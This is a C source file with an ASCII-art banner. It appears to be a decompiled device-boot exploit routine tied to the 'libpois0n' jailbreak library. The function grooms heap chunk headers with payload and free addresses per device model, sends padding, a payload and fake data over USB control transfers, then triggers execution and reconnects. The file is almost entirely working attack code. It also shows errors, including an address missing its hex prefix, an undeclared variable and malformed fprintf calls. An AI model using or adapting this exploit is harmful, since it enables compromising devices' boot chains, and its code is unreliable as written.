#include <stdio.h>
#include <stdlib.h>
                   
//                    cC.co.                   
//                   coc@Cco.                  
//                  cCc@@@ooc.                 
//                 :Cc@@@@8cCc                 
//                :Cc@@@88OO.C:                
//               :oC@@@@88OOO:C:               
//              .oc8@@@88OOCCo:C.              
//             .ocO@888OOOCooocco.             
//             cCC@8888OOOCoccc:oc             
//            :oc@@8888OOOoccc:o.o:            
//           .oc8@88OOOOCCoc:::c::o.           
//           coC@88OOOOOCCc:::..8 oc           
//          :o:8@88OOOOOCoc:....c:.o:          
//          :c8@@O8OOOOCCc:......c:c:          
//          ::88@8888OCCCC...ccc:::::          
//          .cc8@888OOOOOOCccc::::.c.          
//           :coO8OOOOOOOCooc::::.c:           
//            .c.OOOOOCCCooooc::.c.            
//              .c:cooocc::::::c:              
//                 .:::::::::.     

signed int __cdecl upload_exploit() {
int device_type;
signed int payload_address;
int free_address;
int deviceerror;
char *chunk_headers_ptr;
unsigned int sent_counter;
//int v6;
signed int result; 
//signed int v8;
int recv_error_code;
signed int payload_address2;
signed int padding_size;
char payload;
char chunk_headers;
//int v14;
//v14 = *MK_FP(__GS__, 20);
device_type = *(_DWORD *)(device + 16);

if ( device_type == 8930 ) {
padding_size = 0x2A800;
payload_address = 0x8402B001;
free_address = 0x8403BF9C;
} else {
payload_address = 0x84023001;
padding_size = 0x22800;
// free_address = (((device_type == 8920) – 1) & 0xFFFFFFF4) – 0x7BFCC05C;
if(device_type == 8920) free_address = 0x84033FA4;
else free_address = 84033F98;
}

memset(&payload, 0, 0x800);
memcpy(&payload, exploit, 0x230);

if (libpois0n_debug) {
//v8 = payload_address;
fprintf(stderr, 1, "Resetting device counters\n");
//payload_address = v8;
}

payload_address2 = payload_address;
deviceerror = irecv_reset_counters(client);

if ( deviceerror ) {
irecv_strerror(deviceerror);
fprintf(stderr, 1, &aCannotFindS[12]);
result = -1;
} else {
memset(&chunk_headers, 0xCC, 0x800);
chunk_headers_ptr = &chunk_headers;

do {
*(_DWORD *)chunk_headers_ptr = 1029;       
*((_DWORD *)chunk_headers_ptr + 1) = 257;
*((_DWORD *)chunk_headers_ptr + 2) = payload_address2;  
*((_DWORD *)chunk_headers_ptr + 3) = free_address;
chunk_headers_ptr += 64;
} while ((int *)chunk_headers_ptr != &v14);

if (libpois0n_debug)
fprintf(stderr, 1, "Sending chunk headers\n");

sent_counter = 0;
irecv_control_transfer(client, 0x21, 1, 0, 0, &chunk_headers, 0x800);
memset(&chunk_headers, 0xCC, 0x800);

do {
sent_counter += 0x800;
irecv_control_transfer(client, 0x21, 1, 0, 0, &chunk_headers, 0x800);
} while (sent_counter < padding_size);

if (libpois0n_debug)
fprintf(stderr, 1, "Sending exploit payload\n");

irecv_control_transfer(client, 0x21, 1, 0, 0, &payload, 0x800);

if (libpois0n_debug)
fprintf(stderr, 1, "Sending fake data\n");

memset(&chunk_headers, 0xBB, 0x800);
irecv_control_transfer(client, 0xA1, 1, 0, 0, &chunk_headers, 0x800);
irecv_control_transfer(client, 0x21, 1, 0, 0, &chunk_headers, 0x800);

if (libpois0n_debug)
fprintf(stderr, 1, "Executing exploit\n");

irecv_control_transfer(client, 0x21, 2, 0, 0, &chunk_headers, 0);
irecv_reset(client);
irecv_finish_transfer(client);

if (libpois0n_debug) {
fprintf(stderr, 1, "Exploit sent\n");
if (libpois0n_debug)
fprintf(stderr, 1, "Reconnecting to device\n");
}

client = (void *)irecv_reconnect(client, 2);

if (client) {
result = 0;
} else {
if (libpois0n_debug) {
recv_error_code = irecv_strerror(0);
fprintf(stderr, 1, &aCannotFindS[12], recv_error_code);
}
fprintf(stderr, 1, "Unable to reconnect\n");
result = -1;
}
}

// compiler stack check
//if (*MK_FP(__GS__, 20) != v14)
//    __stack_chk_fail(v6, *MK_FP(__GS__, 20) ^ v14);

return result;
}
